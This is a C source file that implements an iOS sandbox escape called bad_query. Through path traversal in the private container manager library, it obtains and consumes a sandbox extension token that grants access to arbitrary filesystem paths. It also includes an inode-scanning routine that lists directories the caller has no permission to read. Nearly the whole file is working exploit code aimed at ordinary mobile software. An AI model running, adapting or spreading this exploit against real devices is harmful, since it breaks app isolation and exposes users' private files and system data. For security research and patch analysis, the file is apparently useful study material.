//
// bad_query.c
// Adapted from forcequitOS/bad_query (unmodified logic)
// Sandbox escape via libsystem_containermanager path traversal.
//

#include "bad_query.h"
#include "xpc_shim.h"  // thay <xpc/xpc.h> để tránh non-modular error với -fmodules
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mount.h>

// fsgetpath: iOS 11+ — dùng extern thay vì #include private header
extern ssize_t fsgetpath(char *buf, size_t bufsize, fsid_t *fsid, uint64_t objid);

// ── containermanager private function types ───────────────────────────────────

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// ── bad_query ─────────────────────────────────────────────────────────────────

int64_t bad_query(char *path, bool create, char *group_identifier, bool is_group) {

    // Validate path
    if (!path || path[0] != '/') return -255; // not absolute

    // If create=false, require path to exist
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254; // not found
    }

    // Load containermanager — thử nhiều path vì iOS 18 và iOS 26 khác nhau
    static const char * const kMgrPaths[] = {
        "/usr/lib/system/libsystem_containermanager.dylib",   // iOS 26+
        "/usr/lib/libsystem_containermanager.dylib",          // iOS 18 (flat layout)
        "/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",
        NULL
    };
    void *mgr = NULL;
    for (int i = 0; kMgrPaths[i] != NULL; i++) {
        mgr = dlopen(kMgrPaths[i], RTLD_NOW | RTLD_LOCAL);
        if (mgr) break;
    }
    if (!mgr) return -1;

    // Resolve symbols
    container_query_create_fn          query_create         = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn       query_set_class      = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_identifiers= (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn       query_set_flags      = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    // iOS 26+: container_query_operation_set_part
    // iOS 18:  container_query_set_part  (không có prefix "operation_")
    container_query_set_part_fn query_set_part =
        (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    if (!query_set_part)
        query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_set_part");

    container_query_set_part_domain_fn query_set_part_domain =
        (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    if (!query_set_part_domain)
        query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_set_part_domain");
    container_query_get_single_result_fn query_get_result   = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn            query_free           = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn    copy_token           = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn       consume_ext          = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_identifiers ||
        !query_set_flags || !query_set_part || !query_set_part_domain ||
        !query_get_result || !query_free || !copy_token || !consume_ext) {
        dlclose(mgr);
        return -6; // dlsym thất bại — tên hàm khác với iOS version này
    }

    void *query = query_create();
    if (!query) { dlclose(mgr); return -2; }

    // Route A: group_identifier == NULL → SystemGroup (class 13, containermanagerd_system)
    // Route B: group_identifier != NULL → AppGroup   (class 7,  containermanagerd)
    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13);
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        query_set_class(query, 7);
        identifier = xpc_string_create(group_identifier);
    }

    query_set_identifiers(query, identifier);
    query_set_part(query, 3); // part 3 = Library/Caches (traversal starting point)

    // Path traversal: go up enough levels to reach filesystem root, then append target
    char *part = NULL;
    if (group_identifier == NULL) {
        // SystemGroup: Library/Caches is 7 levels deep → 7 "../" = root
        if (asprintf(&part, "../../../../../../../..%s", path) == -1) {
            xpc_release(identifier); query_free(query); dlclose(mgr);
            return -5;
        }
    } else {
        // AppGroup: one level deeper → 8 "../"
        if (asprintf(&part, "../../../../../../../../..%s", path) == -1) {
            xpc_release(identifier); query_free(query); dlclose(mgr);
            return -5;
        }
    }
    query_set_part_domain(query, part);

    // Flags differ for App Groups on iOS 26
    if (is_group) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    // Execute query → get container result
    void *result = query_get_result(query);
    if (!result) {
        free(part); xpc_release(identifier); query_free(query); dlclose(mgr);
        return -3; // containermanager rejected (not vulnerable or path not found)
    }

    // Extract sandbox extension token
    char *token = copy_token(result);
    if (!token) {
        free(part); xpc_release(identifier); query_free(query); dlclose(mgr);
        return -4; // kernel refused to issue sandbox token (patched kernel)
    }

    // Consume sandbox extension — grants filesystem access
    int64_t handle = consume_ext(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    dlclose(mgr);

    return handle; // > 0 on success
}

// ── bad_query_release ─────────────────────────────────────────────────────────

void bad_query_release(int64_t handle) {
    if (handle <= 0) return;
    sandbox_extension_release_fn release_ext =
        (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_ext) release_ext(handle);
}

// ── bad_query_list ────────────────────────────────────────────────────────────
// Enumerate direct children of path via inode scan (works without dir-read permission).

char *bad_query_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;

    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);
    char *out = (char *)malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';

    char buf[1200];
    for (int64_t ino = 1; ino <= max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, (uint64_t)ino);
        if (n <= 0) continue;
        const char *p = buf;
        // Normalise /private/var/ → /var/
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        // Must start with our path and have exactly one more component
        if (strncmp(p, path, path_length) != 0) continue;
        if (p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue; // skip deeper entries
        size_t need = strlen(p) + 2;
        if (length + need > (size_t)cap) {
            cap *= 2;
            char *t = (char *)realloc(out, cap);
            if (!t) break;
            out = t;
        }
        length += (size_t)snprintf(out + length, cap - length, "%s\n", p);
    }

    return out;
}
